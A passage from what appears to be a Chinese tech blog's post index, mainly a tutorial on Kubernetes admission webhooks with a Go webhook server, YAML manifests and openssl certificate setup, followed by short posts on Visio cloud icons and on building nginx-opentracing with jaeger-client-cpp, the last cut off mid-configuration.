kubernetes提供的两种类型可自定义的准入控制器，和其他资源一样，可以利用资源清单，动态配置那些资源要被adminssion webhook处理。 kubernetes将这种形式抽象为两种资源：\nValidatingWebhookConfiguration\nMutatingWebhookConfiguration\nValidatingAdmission apiVersion: admissionregistration.k8s.io/v1 kind: ValidatingWebhookConfiguration metadata: name: \u0026quot;pod-policy.example.com\u0026quot; webhooks: - name: \u0026quot;pod-policy.example.com\u0026quot; rules: - apiGroups: [\u0026quot;\u0026quot;] # 拦截资源的Group \u0026quot;\u0026quot; 表示 core。\u0026quot;*\u0026quot; 表示所有。 apiVersions: [\u0026quot;v1\u0026quot;] # 拦截资源的版本 operations: [\u0026quot;CREATE\u0026quot;] # 什么请求下拦截 resources: [\u0026quot;pods\u0026quot;] # 拦截什么资源 scope: \u0026quot;Namespaced\u0026quot; # 生效的范围，cluster还是namespace \u0026quot;*\u0026quot;表示没有范围限制。 clientConfig: # 我们部署的webhook服务， service: # service是在cluster-in模式下 namespace: \u0026quot;example-namespace\u0026quot; name: \u0026quot;example-service\u0026quot; port: 443 # 服务的端口 path: \u0026quot;/validate\u0026quot; # path是对应用于验证的接口 # caBundle是提供给 admission webhook CA证书 caBundle: \u0026quot;Ci0tLS0tQk...\u0026lt;base64-encoded PEM bundle containing the CA that signed the webhook's serving certificate\u0026gt;...tLS0K\u0026quot; admissionReviewVersions: [\u0026quot;v1\u0026quot;, \u0026quot;v1beta1\u0026quot;] sideEffects: None timeoutSeconds: 5 # 1-30s直接，表示请求api的超时时间 MutatingAdmission apiVersion: admissionregistration.k8s.io/v1 kind: ValidatingWebhookConfiguration metadata: name: \u0026quot;valipod-policy.example.com\u0026quot; webhooks: - name: \u0026quot;valipod-policy.example.com\u0026quot; rules: - apiGroups: [\u0026quot;apps\u0026quot;] # 拦截资源的Group \u0026quot;\u0026quot; 表示 core。\u0026quot;*\u0026quot; 表示所有。 apiVersions: [\u0026quot;v1\u0026quot;] # 拦截资源的版本 operations: [\u0026quot;CREATE\u0026quot;] # 什么请求下拦截 resources: [\u0026quot;deployments\u0026quot;] # 拦截什么资源 scope: \u0026quot;Namespaced\u0026quot; # 生效的范围，cluster还是namespace \u0026quot;*\u0026quot;表示没有范围限制。 clientConfig: # 我们部署的webhook服务， url: \u0026quot;https://10.0.0.1:81/validate\u0026quot; # 这里是外部模式 # service: # service是在cluster-in模式下 # namespace: \u0026quot;default\u0026quot; # name: \u0026quot;admission-webhook\u0026quot; # port: 81 # 服务的端口 # path: \u0026quot;/mutate\u0026quot; # path是对应用于验证的接口 # caBundle是提供给 admission webhook CA证书 caBundle: \u0026quot;Ci0tLS0tQk...\u0026lt;base64-encoded PEM bundle containing the CA that signed the webhook's serving certificate\u0026gt;...tLS0K\u0026quot; admissionReviewVersions: [\u0026quot;v1\u0026quot;] sideEffects: None timeoutSeconds: 5 # 1-30s直接，表示请求api的超时时间 注：对于webhook，也可以引入外部的服务，并非必须部署到集群内部\n对于外部服务来讲，需要 clientConfig 中的 service , 更换为 url ; 通过 url 参数可以将一个外部的服务引入\napiVersion: admissionregistration.k8s.io/v1 kind: MutatingWebhookConfiguration ... webhooks: - name: my-webhook.example.com clientConfig: url: \u0026quot;https://my-webhook.example.com:9443/my-webhook-path\u0026quot; ... 注：这里的url规则必须准守下列形式：\nscheme://host:port/path 使用了url 时，这里不应填写集群内的服务 scheme 必须是 https，不能为http，这就意味着，引入外部时也需要 配置时使用了，?xx=xx 的参数也是不被允许的（官方说法是这样的，通过源码学习了解到因为会发送特定的请求体，所以无需管参数） 更多的配置可以参考kubernetes官方提供的 doc\n准备一个webhook 让我们编写我们的 webhook server。将创建两个钩子，/mutate 与 /validate；\n/mutate 将在创建deployment资源时，基于版本，给资源加上注释 webhook.example.com/allow: true /validate 将对 /mutate 增加的 allow:true 那么则继续，否则拒绝。 这里为了方便，全部写在一起了，实际上不符合软件的设计。在kubernetes代码库中也提供了一个webhook server，可以参考他这个webhook server来学习具体要做什么\npackage main import ( \u0026quot;context\u0026quot; \u0026quot;crypto/tls\u0026quot; \u0026quot;encoding/json\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;io/ioutil\u0026quot; \u0026quot;net/http\u0026quot; \u0026quot;os\u0026quot; \u0026quot;os/signal\u0026quot; \u0026quot;strings\u0026quot; \u0026quot;syscall\u0026quot; v1admission \u0026quot;k8s.io/api/admission/v1\u0026quot; \u0026quot;k8s.io/apimachinery/pkg/runtime\u0026quot; \u0026quot;k8s.io/apimachinery/pkg/runtime/serializer\u0026quot; appv1 \u0026quot;k8s.io/api/apps/v1\u0026quot; metav1 \u0026quot;k8s.io/apimachinery/pkg/apis/meta/v1\u0026quot; \u0026quot;k8s.io/klog\u0026quot; ) type patch struct { Op string `json:\u0026quot;op\u0026quot;` Path string `json:\u0026quot;path\u0026quot;` Value map[string]string `json:\u0026quot;value\u0026quot;` } func serve(w http.ResponseWriter, r *http.Request) { var body []byte if data, err := ioutil.ReadAll(r.Body); err == nil { body = data } klog.Infof(fmt.Sprintf(\u0026quot;receive request: %v....\u0026quot;, string(body)[:130])) if len(body) == 0 { klog.Error(fmt.Sprintf(\u0026quot;admission request body is empty\u0026quot;)) http.Error(w, fmt.Errorf(\u0026quot;admission request body is empty\u0026quot;).Error(), http.StatusBadRequest) return } var admission v1admission.AdmissionReview codefc := serializer.NewCodecFactory(runtime.NewScheme()) decoder := codefc.UniversalDeserializer() _, _, err := decoder.Decode(body, nil, \u0026amp;admission) if err != nil { msg := fmt.Sprintf(\u0026quot;Request could not be decoded: %v\u0026quot;, err) klog.Error(msg) http.Error(w, msg, http.StatusBadRequest) return } if admission.Request == nil { klog.Error(fmt.Sprintf(\u0026quot;admission review can't be used: Request field is nil\u0026quot;)) http.Error(w, fmt.Errorf(\u0026quot;admission review can't be used: Request field is nil\u0026quot;).Error(), http.StatusBadRequest) return } switch strings.Split(r.RequestURI, \u0026quot;?\u0026quot;)[0] { case \u0026quot;/mutate\u0026quot;: req := admission.Request var admissionResp v1admission.AdmissionReview admissionResp.APIVersion = admission.APIVersion admissionResp.Kind = admission.Kind klog.Infof(\u0026quot;AdmissionReview for Kind=%v, Namespace=%v Name=%v UID=%v Operation=%v\u0026quot;, req.Kind.Kind, req.Namespace, req.Name, req.UID, req.Operation) switch req.Kind.Kind { case \u0026quot;Deployment\u0026quot;: var ( respstr []byte err error deploy appv1.Deployment ) if err = json.Unmarshal(req.Object.Raw, \u0026amp;deploy); err != nil { respStructure := v1admission.AdmissionResponse{Result: \u0026amp;metav1.Status{ Message: fmt.Sprintf(\u0026quot;could not unmarshal resouces review request: %v\u0026quot;, err), Code: http.StatusInternalServerError, }} klog.Error(fmt.Sprintf(\u0026quot;could not unmarshal resouces review request: %v\u0026quot;, err)) if respstr, err = json.Marshal(respStructure); err != nil { klog.Error(fmt.Errorf(\u0026quot;could not unmarshal resouces review response: %v\u0026quot;, err)) http.Error(w, fmt.Errorf(\u0026quot;could not unmarshal resouces review response: %v\u0026quot;, err).Error(), http.StatusInternalServerError) return } http.Error(w, string(respstr), http.StatusBadRequest) return } current_annotations := deploy.GetAnnotations() pl := []patch{} for k, v := range current_annotations { pl = append(pl, patch{ Op: \u0026quot;add\u0026quot;, Path: \u0026quot;/metadata/annotations\u0026quot;, Value: map[string]string{ k: v, }, }) } pl = append(pl, patch{ Op: \u0026quot;add\u0026quot;, Path: \u0026quot;/metadata/annotations\u0026quot;, Value: map[string]string{ deploy.Name + \u0026quot;/Allow\u0026quot;: \u0026quot;true\u0026quot;, }, }) annotationbyte, err := json.Marshal(pl) if err != nil { http.Error(w, err.Error(), http.StatusInternalServerError) return } respStructure := \u0026amp;v1admission.AdmissionResponse{ UID: req.UID, Allowed: true, Patch: annotationbyte, PatchType: func() *v1admission.PatchType { t := v1admission.PatchTypeJSONPatch return \u0026amp;t }(), Result: \u0026amp;metav1.Status{ Message: fmt.Sprintf(\u0026quot;could not unmarshal resouces review request: %v\u0026quot;, err), Code: http.StatusOK, }, } admissionResp.Response = respStructure klog.Infof(\u0026quot;sending response: %s....\u0026quot;, admissionResp.Response.String()[:130]) respByte, err := json.Marshal(admissionResp) if err != nil { klog.Errorf(\u0026quot;Can't encode response messages: %v\u0026quot;, err) http.Error(w, err.Error(), http.StatusInternalServerError) } klog.Infof(\u0026quot;prepare to write response...\u0026quot;) w.Header().Set(\u0026quot;Content-Type\u0026quot;, \u0026quot;application/json\u0026quot;) if _, err := w.Write(respByte); err != nil { klog.Errorf(\u0026quot;Can't write response: %v\u0026quot;, err) http.Error(w, fmt.Sprintf(\u0026quot;could not write response: %v\u0026quot;, err), http.StatusInternalServerError) } default: klog.Error(fmt.Sprintf(\u0026quot;unsupport resouces review request type\u0026quot;)) http.Error(w, \u0026quot;unsupport resouces review request type\u0026quot;, http.StatusBadRequest) } case \u0026quot;/validate\u0026quot;: req := admission.Request var admissionResp v1admission.AdmissionReview admissionResp.APIVersion = admission.APIVersion admissionResp.Kind = admission.Kind klog.Infof(\u0026quot;AdmissionReview for Kind=%v, Namespace=%v Name=%v UID=%v Operation=%v\u0026quot;, req.Kind.Kind, req.Namespace, req.Name, req.UID, req.Operation) var ( deploy appv1.Deployment respstr []byte ) switch req.Kind.Kind { case \u0026quot;Deployment\u0026quot;: if err = json.Unmarshal(req.Object.Raw, \u0026amp;deploy); err != nil { respStructure := v1admission.AdmissionResponse{Result: \u0026amp;metav1.Status{ Message: fmt.Sprintf(\u0026quot;could not unmarshal resouces review request: %v\u0026quot;, err), Code: http.StatusInternalServerError, }} klog.Error(fmt.Sprintf(\u0026quot;could not unmarshal resouces review request: %v\u0026quot;, err)) if respstr, err = json.Marshal(respStructure); err != nil { klog.Error(fmt.Errorf(\u0026quot;could not unmarshal resouces review response: %v\u0026quot;, err)) http.Error(w, fmt.Errorf(\u0026quot;could not unmarshal resouces review response: %v\u0026quot;, err).Error(), http.StatusInternalServerError) return } http.Error(w, string(respstr), http.StatusBadRequest) return } } al := deploy.GetAnnotations() respStructure := v1admission.AdmissionResponse{ UID: req.UID, } if al[fmt.Sprintf(\u0026quot;%s/Allow\u0026quot;, deploy.Name)] == \u0026quot;true\u0026quot; { respStructure.Allowed = true respStructure.Result = \u0026amp;metav1.Status{ Code: http.StatusOK, } } else { respStructure.Allowed = false respStructure.Result = \u0026amp;metav1.Status{ Code: http.StatusForbidden, Reason: func() metav1.StatusReason { return metav1.StatusReasonForbidden }(), Message: fmt.Sprintf(\u0026quot;the resource %s couldn't to allow entry.\u0026quot;, deploy.Kind), } } admissionResp.Response = \u0026amp;respStructure klog.Infof(\u0026quot;sending response: %s....\u0026quot;, admissionResp.Response.String()[:130]) respByte, err := json.Marshal(admissionResp) if err != nil { klog.Errorf(\u0026quot;Can't encode response messages: %v\u0026quot;, err) http.Error(w, err.Error(), http.StatusInternalServerError) } klog.Infof(\u0026quot;prepare to write response...\u0026quot;) w.Header().Set(\u0026quot;Content-Type\u0026quot;, \u0026quot;application/json\u0026quot;) if _, err := w.Write(respByte); err != nil { klog.Errorf(\u0026quot;Can't write response: %v\u0026quot;, err) http.Error(w, fmt.Sprintf(\u0026quot;could not write response: %v\u0026quot;, err), http.StatusInternalServerError) } } } func main() { var ( cert, key string ) if cert = os.Getenv(\u0026quot;TLS_CERT\u0026quot;); len(cert) == 0 { cert = \u0026quot;./tls/tls.crt\u0026quot; } if key = os.Getenv(\u0026quot;TLS_KEY\u0026quot;); len(key) == 0 { key = \u0026quot;./tls/tls.key\u0026quot; } ca, err := tls.LoadX509KeyPair(cert, key) if err != nil { klog.Error(err.Error()) return } server := \u0026amp;http.Server{ Addr: \u0026quot;:81\u0026quot;, TLSConfig: \u0026amp;tls.Config{ Certificates: []tls.Certificate{ ca, }, }, } httpserver := http.NewServeMux() httpserver.HandleFunc(\u0026quot;/validate\u0026quot;, serve) httpserver.HandleFunc(\u0026quot;/mutate\u0026quot;, serve) httpserver.HandleFunc(\u0026quot;/ping\u0026quot;, func(w http.ResponseWriter, r *http.Request) { klog.Info(fmt.Sprintf(\u0026quot;%s %s\u0026quot;, r.RequestURI, \u0026quot;pong\u0026quot;)) fmt.Fprint(w, \u0026quot;pong\u0026quot;) }) server.Handler = httpserver go func() { if err := server.ListenAndServeTLS(\u0026quot;\u0026quot;, \u0026quot;\u0026quot;); err != nil { klog.Errorf(\u0026quot;Failed to listen and serve webhook server: %v\u0026quot;, err) } }() klog.Info(\u0026quot;starting serve.\u0026quot;) signalChan := make(chan os.Signal, 1) signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM) \u0026lt;-signalChan klog.Infof(\u0026quot;Got shut signal, shutting...\u0026quot;) if err := server.Shutdown(context.Background()); err != nil { klog.Errorf(\u0026quot;HTTP server Shutdown: %v\u0026quot;, err) } } 对应的Dockerfile\nFROM golang:alpine AS builder MAINTAINER cylon WORKDIR /admission COPY ./ /admission ENV GOPROXY https://goproxy.cn,direct RUN \\ sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories \u0026amp;\u0026amp; \\ apk add upx \u0026amp;\u0026amp; \\ GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags \u0026quot;-s -w\u0026quot; -o webhook main.go \u0026amp;\u0026amp; \\ upx -1 webhook \u0026amp;\u0026amp; \\ chmod +x webhook FROM alpine AS runner WORKDIR /go/admission COPY --from=builder /admission/webhook . VOLUME [\u0026quot;/admission\u0026quot;] 集群内部部署所需的资源清单\napiVersion: v1 kind: Service metadata: name: admission-webhook labels: app: admission-webhook spec: ports: - port: 81 targetPort: 81 selector: app: simple-webhook --- apiVersion: apps/v1 kind: Deployment metadata: labels: app: simple-webhook name: simple-webhook spec: replicas: 1 selector: matchLabels: app: simple-webhook template: metadata: labels: app: simple-webhook spec: containers: - image: cylonchau/simple-webhook:v0.0.2 imagePullPolicy: IfNotPresent name: webhook command: [\u0026quot;./webhook\u0026quot;] env: - name: \u0026quot;TLS_CERT\u0026quot; value: \u0026quot;./tls/tls.crt\u0026quot; - name: \u0026quot;TLS_KEY\u0026quot; value: \u0026quot;./tls/tls.key\u0026quot; - name: NS_NAME valueFrom: fieldRef: apiVersion: v1 fieldPath: metadata.namespace ports: - containerPort: 81 volumeMounts: - name: tlsdir mountPath: /go/admission/tls readOnly: true volumes: - name: tlsdir secret: secretName: webhook --- apiVersion: admissionregistration.k8s.io/v1 kind: MutatingWebhookConfiguration metadata: name: \u0026quot;pod-policy.example.com\u0026quot; webhooks: - name: \u0026quot;pod-policy.example.com\u0026quot; rules: - apiGroups: [\u0026quot;apps\u0026quot;] # 拦截资源的Group \u0026quot;\u0026quot; 表示 core。\u0026quot;*\u0026quot; 表示所有。 apiVersions: [\u0026quot;v1\u0026quot;] # 拦截资源的版本 operations: [\u0026quot;CREATE\u0026quot;] # 什么请求下拦截 resources: [\u0026quot;deployments\u0026quot;] # 拦截什么资源 scope: \u0026quot;Namespaced\u0026quot; # 生效的范围，cluster还是namespace \u0026quot;*\u0026quot;表示没有范围限制。 clientConfig: # 我们部署的webhook服务， url: \u0026quot;https://10.0.0.1:81/mutate\u0026quot; # service: # service是在cluster-in模式下 # namespace: \u0026quot;default\u0026quot; # name: \u0026quot;admission-webhook\u0026quot; # port: 81 # 服务的端口 # path: \u0026quot;/mutate\u0026quot; # path是对应用于验证的接口 # caBundle是提供给 admission webhook CA证书 caBundle: Put you CA (base64 encode) in here admissionReviewVersions: [\u0026quot;v1\u0026quot;] sideEffects: None timeoutSeconds: 5 # 1-30s直接，表示请求api的超时时间 --- apiVersion: admissionregistration.k8s.io/v1 kind: ValidatingWebhookConfiguration metadata: name: \u0026quot;valipod-policy.example.com\u0026quot; webhooks: - name: \u0026quot;valipod-policy.example.com\u0026quot; rules: - apiGroups: [\u0026quot;apps\u0026quot;] # 拦截资源的Group \u0026quot;\u0026quot; 表示 core。\u0026quot;*\u0026quot; 表示所有。 apiVersions: [\u0026quot;v1\u0026quot;] # 拦截资源的版本 operations: [\u0026quot;CREATE\u0026quot;] # 什么请求下拦截 resources: [\u0026quot;deployments\u0026quot;] # 拦截什么资源 scope: \u0026quot;Namespaced\u0026quot; # 生效的范围，cluster还是namespace \u0026quot;*\u0026quot;表示没有范围限制。 clientConfig: # 我们部署的webhook服务， # service: # service是在cluster-in模式下 # namespace: \u0026quot;default\u0026quot; # name: \u0026quot;admission-webhook\u0026quot; # port: 81 # 服务的端口 # path: \u0026quot;/mutate\u0026quot; # path是对应用于验证的接口 # caBundle是提供给 admission webhook CA证书 caBundle: Put you CA (base64 encode) in here admissionReviewVersions: [\u0026quot;v1\u0026quot;] sideEffects: None timeoutSeconds: 5 # 1-30s直接，表示请求api的超时时间 这里需要主义的问题 证书问题\n如果需要 cluster-in ，那么则需要对对应webhookconfig资源配置 service ；如果使用的是外部部署，则需要配置对应访问地址，如：\u0026ldquo;https://xxxx:port/method\u0026rdquo;\n这两种方式的证书均需要对应的 subjectAltName ，cluster-in 模式 需要对应service名称，如，至少包含serviceName.NS.svc 这一个域名。\n下面就是证书类问题的错误\nFailed calling webhook, failing closed pod-policy.example.com: failed calling webhook \u0026quot;pod-policy.example.com\u0026quot;: Post https://admission-webhook.default.svc:81/mutate?timeout=5s: x509: certificate signed by unknown authority (possibly because of \u0026quot;crypto/rsa: verification error\u0026quot; while trying to verify candidate authority certificate \u0026quot;admission-webhook-ca\u0026quot;) 相应信息问题\n上面我们了解到的APIServer是去发出 v1admission.AdmissionReview 也就是 Request 和 Response类型的，所以，为了更清晰的表示出问题所在，需要对响应格式中的 Reason 与 Message 配置，这也就是我们在客户端看到的报错信息。\n\u0026amp;metav1.Status{ Code: http.StatusForbidden, Reason: func() metav1.StatusReason { return metav1.StatusReasonForbidden }(), Message: fmt.Sprintf(\u0026quot;the resource %s couldn't to allow entry.\u0026quot;, deploy.Kind), } 通过上面的设置用户可以看到下列错误\n$ kubectl apply -f nginx.yaml Error from server (Forbidden): error when creating \u0026quot;nginx.yaml\u0026quot;: admission webhook \u0026quot;valipod-policy.example.com\u0026quot; denied the request: the resource Deployment couldn't to allow entry. 注：必须的参数还包含，UID，allowed，这两个是必须的，上面阐述的只是对用户友好的提示信息\n下面的报错就是对相应格式设置错误\nError from server (InternalError): error when creating \u0026quot;nginx.yaml\u0026quot;: Internal error occurred: failed calling webhook \u0026quot;pod-policy.example.com\u0026quot;: the server rejected our request for an unknown reason 相应信息版本问题\n相应信息也需要指定一个版本，这个与请求来的结构中拿即可\nadmissionResp.APIVersion = admission.APIVersion admissionResp.Kind = admission.Kind 下面是没有为对应相应信息配置对应KV的值出现的报错\nError from server (InternalError): error when creating \u0026quot;nginx.yaml\u0026quot;: Internal error occurred: failed calling webhook \u0026quot;pod-policy.example.com\u0026quot;: expected webhook response of admission.k8s.io/v1, Kind=AdmissionReview, got /, Kind= 关于patch\nkubernetes中patch使用的是特定的规范，如 jsonpatch\nkubernetes当前唯一支持的 patchType 是 JSONPatch。 有关更多详细信息，请参见 JSON patch\n对于 jsonpatch 是一个固定的类型，在go中必须定义其结构体\n{ \u0026quot;op\u0026quot;: \u0026quot;add\u0026quot;, // 做什么操作 \u0026quot;path\u0026quot;: \u0026quot;/spec/replicas\u0026quot;, // 操作的路径 \u0026quot;value\u0026quot;: 3 // 对应添加的key value } 下面就是字符串类型设置为布尔型产生的报错\nError from server (InternalError): error when creating \u0026quot;nginx.yaml\u0026quot;: Internal error occurred: v1.Deployment.ObjectMeta: v1.ObjectMeta.Annotations: ReadString: expects \u0026quot; or n, but found t, error found in #10 byte of ...|t/Allow\u0026quot;:true},\u0026quot;crea|..., bigger context ...|tadata\u0026quot;:{\u0026quot;annotations\u0026quot;:{\u0026quot;nginx-deployment/Allow\u0026quot;:true},\u0026quot;creationTimestamp\u0026quot;:null,\u0026quot;managedFields\u0026quot;:[{\u0026quot;m|.. 准备证书 Ubuntu\ntouch ./demoCAindex.txt touch ./demoCA/serial touch ./demoCA/crlnumber echo 01 \u0026gt; ./demoCA/serial mkdir ./demoCA/newcerts openssl genrsa -out cakey.pem 2048 openssl req -new \\ -x509 \\ -key cakey.pem \\ -out cacert.pem \\ -days 3650 \\ -subj \u0026quot;/CN=admission webhook ca\u0026quot; openssl genrsa -out tls.key 2048 openssl req -new \\ -key tls.key \\ -subj \u0026quot;/CN=admission webhook client\u0026quot; \\ -reqexts webhook \\ -config \u0026lt;(cat /etc/ssl/openssl.cnf \\ \u0026lt;(printf \u0026quot;[webhook]\\nsubjectAltName=DNS: admission-webhook, DNS: admission-webhook.default.svc, DNS: admission-webhook.default.svc.cluster.local, IP:10.0.0.1, IP:10.0.0.4\u0026quot;)) \\ -out tls.csr sed -i 's/= match/= optional/g' /etc/ssl/openssl.cnf openssl ca \\ -in tls.csr \\ -cert cacert.pem \\ -keyfile cakey.pem \\ -out tls.crt \\ -days 300 \\ -extensions webhook \\ -extfile \u0026lt;(cat /etc/ssl/openssl.cnf \\ \u0026lt;(printf \u0026quot;[webhook]\\nsubjectAltName=DNS: admission-webhook, DNS: admission-webhook.default.svc, DNS: admission-webhook.default.svc.cluster.local, IP:10.0.0.1, IP:10.0.0.4\u0026quot;)) CentOS\ntouch /etc/pki/CA/index.txt touch /etc/pki/CA/serial # 下一个要颁发的编号 16进制 touch /etc/pki/CA/crlnumber echo 01 \u0026gt; /etc/pki/CA/serial openssl req -new \\ -x509 \\ -key cakey.pem \\ -out cacert.pem \\ -days 3650 \\ -subj \u0026quot;/CN=admission webhook ca\u0026quot; openssl genrsa -out tls.key 2048 openssl req -new \\ -key tls.key \\ -subj \u0026quot;/CN=admission webhook client\u0026quot; \\ -reqexts webhook \\ -config \u0026lt;(cat /etc/pki/tls/openssl.cnf \\ \u0026lt;(printf \u0026quot;[webhook]\\nsubjectAltName=DNS: admission-webhook, DNS: admission-webhook.default.svc, DNS: admission-webhook.default.svc.cluster.local, IP:10.0.0.1, IP:10.0.0.4\u0026quot;)) \\ -out tls.csr sed -i 's/= match/= optional/g' /etc/ssl/openssl.cnf openssl ca \\ -in tls.csr \\ -cert cacert.pem \\ -keyfile cakey.pem \\ -out tls.crt \\ -days 300 \\ -extensions webhook \\ -extfile \u0026lt;(cat /etc/pki/tls/openssl.cnf \\ \u0026lt;(printf \u0026quot;[webhook]\\nsubjectAltName=DNS: admission-webhook, DNS: admission-webhook.default.svc, DNS: admission-webhook.default.svc.cluster.local, IP:10.0.0.1, IP:10.0.0.4\u0026quot;)) 通过部署测试结果 可以看到我们自己注入的 annotation nginx-deployment/Allow: true，在该示例中，仅为演示过程，而不是真的策略，实际环境中可以根据情况进行定制自己的策略。\n结果可以看出，当在 mutating 中不通过，即缺少对应的 annotation 标签 , 则 validating 会不允许准入\n$ kubectl describe deploy nginx-deployment Name: nginx-deployment Namespace: default CreationTimestamp: Mon, 11 Jul 2022 20:25:16 +0800 Labels: \u0026lt;none\u0026gt; Annotations: deployment.kubernetes.io/revision: 1 nginx-deployment/Allow: true Selector: app=nginx Replicas: 1 desired | 1 updated | 1 total | 1 available | 0 unavailable StrategyType: RollingUpdate MinReadySeconds: 0 RollingUpdateStrategy: 25% max unavailable, 25% max surge Pod Template: Labels: app=nginx Containers: nginx: Image: nginx:1.14.2 Reference\nextensible admission controllers\nK8S client-go Patch example\nadmission controllers response\na guide to kubernetes admission controllers\n","permalink":"https://www.oomkill.com/2022/07/ch33-admission-webhook/","summary":"","title":"深入理解Kubernetes 4A - Admission Control源码解析"},{"content":"各个云厂商都会为自己的服务提供通用可缩放矢量图形 (SVG) 图标，以便用户为自己的软件绘制架构图，例如Microsoft 为Visio 提供 Azure 服务的图标。文本在这里简单整理了几个关于云服务的图标\nAzure-Design 提供了大量并完整的azure的一些图标 AWS-Architecture-Icons 提供了一些关于AWS的图标，不过图标为2019年时的 Microsoft-Integration-and-Azure 整合了一些关于微软的图标，并附带了矢量图 更多的图标可以在github或google搜索相关关键词 visio stencil 网络上还是有很多相关的图标库\n将图标导入到visio中 为了能使下载的图标在Visio 中可用，只需要简单的一个步骤即可。\n将下载下来的图标放置到 C:\\Users\\\u0026lt;UserName\u0026gt;\\Documents\\My Shapes 中文系统为 用户目录\\文档\\我的图形 我的图形需要安装visio后才会有这个文件夹\n如图所示：\n测试导入后的效果，我们在这里导入了aws与azure的图标库，故可以看到有两个，但是两个中又包含很多，已经足够使用了\n最后再附上一个大神制作的 VISIO Protable 版本，匿名网盘，失效不补\n","permalink":"https://www.oomkill.com/2022/07/visio-custom-icon/","summary":"","title":"如何为visio扩展云服务图标"},{"content":"Background NGINX 是一个通用且流行的应用程序。也是最流行的 Web 服务器，它可用于提供静态文件内容，但也通常与其他服务一起用作分布式系统中的组件，在其中它用作反向代理、负载均衡 或 API 网关。\n分布式追踪 distributed tracing 是一种可用于分析与监控应用程序的机制，将追踪在从源到目的的整个过程中的单个请求，这与仅通过单个应用程序域来追踪请求的形式不同。\n换句话说，我们可以说分布式追踪是对跨多个系统的多个请求的拼接。拼接通常由一个或多个相关 ID 完成，并且跟踪通常是一组记录的、跨所有系统的结构化日志事件，存储在一个中心位置。\n在这种背景的情况下， OpenTracing 应运而生。OpenTracing 是一个与应用供应商无关的 API，它可帮助开发人员轻松地跟踪单一请求的域。目前有多种开源产品都支持 OpenTracing（例如，Jaeger, skywalking 等），并将其作为一种检测分布式追踪的标准化方法。\n本文将围绕，从0到1实现在nginx配置分布式追踪的架构的简单实例说明。本文实例使用的组件为\nnginx v1.22 jaeger-all-in-on v1.38 nginx-opentracing v1.22 jaeger-client-cpp v0.9 源码构建nginx-opentracing 准备nginx-opentracing nginx-opentracing 仓库中可以看到，官方为每个nginx版本都提供了一个编译好的动态库（Nginx1.19.13+），我们可以直接拿来使用这个动态库，如果你想将这个利用Nginx 提供的编译参数 --add-module=/path/to/module 构建为nginx的内置功能的话，可能会出现一些问题，例如下面的一些错误：\nngx_http_opentracing_module.so/config was found /root/nginx-opentracing-0.25.0/opentracing//src/ngx_http_opentracing_module.cpp In file included from /root/nginx-opentracing-0.25.0/opentracing//src/ngx_http_opentracing_module.cpp:1:0: /root/nginx-opentracing-0.25.0/opentracing//src/load_tracer.h:3:38: fatal error: opentracing/dynamic_load.h: No such file or directory 根据 issue 中查询得知 nginx-opentracing 需要嵌入到nginx中，是需要一些 opentracing-cpp 因为对c++不熟，尝试调试很久还是上面的错误，故直接使用了官方提供的动态库。\n准备jaeger-client-cpp 根据 nginx-opentracing 中提到的，还需要一个 jaeger-client-cpp 的 tracer 才可以正常运行（这也是作为jaeger架构中的角色）\n来到 jaeger-client-cpp 看到Release提供的编译好的动态库已经很久了，而最新版都没有提供相应编译的版本，需要我们自己编译\n说明： 编译依赖CMake 3.3+，gcc 4.9.2+\n我们的编译环境使用CentOS 7 默认gcc与CMake都符合要求需要自行编译两个的版本。\n编译gcc gcc下载地址：https://ftp.gnu.org/gnu/gcc/\ncd gcc-5.4.0 ./contrib/download_prerequisites mkdir gcc-build-5.4.0 cd gcc-build-5.4.0 /usr/local/src/gcc-5.4.0/configure \\ --enable-checking=release \\ --enable-languages=c,c++ \\ --disable-multilib make \u0026amp;\u0026amp; make install 引用处理 refer 1\ncd /usr/bin/ mv gcc gcc_back mv g++ g++_back ln -s /usr/local/bin/gcc gcc ln -s /usr/local/bin/g++ g++ 编译时遇到几个问题\n/lib64/libstdc++.so.6: version GLIBCXX_3.4.20' not found\ngcc 编译，libgcc动态库有改动，恢复原状即可\nconfigure: error: C++ compiler missing or inoperational make[2]: \\*** [configure-stage1-libcpp] Error 1 make[2]: Leaving directory `/home/clay/programming/C++/gcc-4.8.1' make[1]: \\*** [stage1-bubble] Error 2 make[1]: Leaving directory `/home/clay/programming/C++/gcc-4.8.1' make: \\*** [all] Error 2 编译cmake ./configure --prefix=/path/to/app make make install 这里遇到一个小问题 编译过程中遇到 [libstdc++.so.6: version GLIBCXX_3.4.20 not found\n因为这里使用了自己编译的gcc版本，需要指定下动态库的路径 refer 2\nLD_LIBRARY_PATH=/usr/local/lib64 ./configure --prefix=/usr/local/cmake 编译jaeger-client-cpp 这里根据官方提供的步骤操作即可\ncd jaeger-client-cpp-0.9.0/ mkdir build cd build # 这里建议使用下科学上网，编译过程中会使用Hunter自动下载所需的依赖项 ALL_PROXY=http://x.0.0.x:10811 /usr/local/cmake/bin/cmake .. make 注：依赖项挺大的，下载时间可能很长，会hang主，只需等待结束即可\n​\t编译完成后 libjaegertracing.so.0.9.0 则是我们需要的\n编译nginx ./configure \\ --user=web_www \\ --group=web_www \\ --with-pcre \\ --with-compat \\ --with-http_ssl_module \\ --with-http_gzip_static_module \\ --prefix=/root/nginx \\ --with-http_stub_status_module --with-compat 必须加上，表面允许使用动态库，否则编译完在启动时会报下面的错误\nnginx: [emerg] module \u0026quot;/root/nginx/conf/ngx_http_opentracing_module.so\u0026quot; is not binary compatible in /root/nginx/conf/nginx.conf:1 遇到的问题，cc nou found，这里只需将 gcc 软连接一份为 cc 即可\n配置nginx 准备jaeger-client的配置 jaeger.json，参数的说明可以参考configuration\n{ \u0026quot;service_name\u0026quot;: \u0026quot;nginx\u0026quot;, // 服务名 \u0026quot;sampler\u0026quot;: { \u0026quot;type\u0026quot;: \u0026quot;const\u0026quot;, \u0026quot;param\u0026quot;: 1 }, \u0026quot;reporter\u0026quot;: { \u0026quot;localAgentHostPort\u0026quot;: \u0026quot;jaeger:6831\u0026quot; // jaeger agent的地址 }, \u0026quot;headers\u0026quot;: { // jaeger的默认的jaeger Baggage头设置 \u0026quot;jaegerDebugHeader\u0026quot;: \u0026quot;jaeger-debug-id\u0026quot;, \u0026quot;jaegerBaggageHeader\u0026quot;: \u0026quot;jaeger-baggage\u0026quot;, \u0026quot;traceBaggageHeaderPrefix\u0026quot;: \u0026quot;uberctx-\u0026quot; }, 